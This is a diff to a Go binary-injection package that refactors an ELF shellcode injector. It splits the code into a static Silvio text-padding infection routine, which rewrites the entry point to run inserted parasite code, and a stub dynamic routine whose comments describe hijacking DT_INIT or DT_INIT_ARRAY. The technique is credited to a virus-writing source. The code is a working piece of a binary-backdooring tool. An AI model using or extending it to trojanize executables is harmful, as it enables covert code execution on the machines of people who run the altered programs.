@@ -1,7 +1,6 @@
 package bj
 
 import (
-	"errors"
 	"io/ioutil"
 	"log"
 	"sort"
@@ -46,6 +45,14 @@ func ElfBinject(sourceFile string, destFile string, shellcodeFile string, config
 	// END CODE CAVE DETECTION SECTION
 	//
 
+	if elfFile.FileHeader.Type == elf.ET_EXEC {
+		return staticSilvioMethod(elfFile, destFile, userShellCode)
+	} else {
+		return dynamicMethod(elfFile, destFile, userShellCode)
+	}
+}
+
+func staticSilvioMethod(elfFile *elf.File, destFile string, userShellCode []byte) error {
 	/*
 			  Circa 1998: http://vxheavens.com/lib/vsc01.html  <--Thanks to elfmaster
 		        6. Increase p_shoff by PAGE_SIZE in the ELF header
@@ -87,30 +94,7 @@ func ElfBinject(sourceFile string, destFile string, shellcodeFile string, config
 			// 1. Locate the text segment program header
 			// -Modify the entry point of the ELF header to point to the new code (p_vaddr + p_filesz)
 			originalEntry := elfFile.FileHeader.Entry
-
-			switch elfFile.FileHeader.Type {
-			case elf.ET_EXEC:
-				elfFile.FileHeader.Entry = p.Vaddr + p.Filesz
-			case elf.ET_DYN:
-				// The injected code needs to be executed before any init code in the
-				// binary. There are three possible cases:
-				// - The binary has no init code at all. In this case, we will add a
-				//   DT_INIT entry pointing to the injected code.
-				// - The binary has a DT_INIT entry. In this case, we will interpose:
-				//   we change DT_INIT to point to the injected code, and have the
-				//   injected code call the original DT_INIT entry point.
-				// - The binary has no DT_INIT entry, but has a DT_INIT_ARRAY. In this
-				//   case, we interpose as well, by replacing the first entry in the
-				//   array to point to the injected code, and have the injected code
-				//   call the original first entry.
-				// The binary may have .ctors instead of DT_INIT_ARRAY, for its init
-				// functions, but this falls into the second case above, since .ctors
-				// are actually run by DT_INIT code.
-				// from positron/elfhack
-
-			default:
-				return errors.New("Unknown Executable Type: " + string(elfFile.FileHeader.Type))
-			}
+			elfFile.FileHeader.Entry = p.Vaddr + p.Filesz
 
 			// 7. Patch the insertion code (parasite) to jump to the entry point (original)
 			scAddr = p.Vaddr + p.Filesz
@@ -149,4 +133,24 @@ func ElfBinject(sourceFile string, destFile string, shellcodeFile string, config
 	elfFile.Insertion = shellcode
 
 	return elfFile.Write(destFile)
+}
+
+func dynamicMethod(elfFile *elf.File, destFile string, userShellCode []byte) error {
+	// The injected code needs to be executed before any init code in the
+	// binary. There are three possible cases:
+	// - The binary has no init code at all. In this case, we will add a
+	//   DT_INIT entry pointing to the injected code.
+	// - The binary has a DT_INIT entry. In this case, we will interpose:
+	//   we change DT_INIT to point to the injected code, and have the
+	//   injected code call the original DT_INIT entry point.
+	// - The binary has no DT_INIT entry, but has a DT_INIT_ARRAY. In this
+	//   case, we interpose as well, by replacing the first entry in the
+	//   array to point to the injected code, and have the injected code
+	//   call the original first entry.
+	// The binary may have .ctors instead of DT_INIT_ARRAY, for its init
+	// functions, but this falls into the second case above, since .ctors
+	// are actually run by DT_INIT code.
+	// from positron/elfhack
+
+	return nil
 }
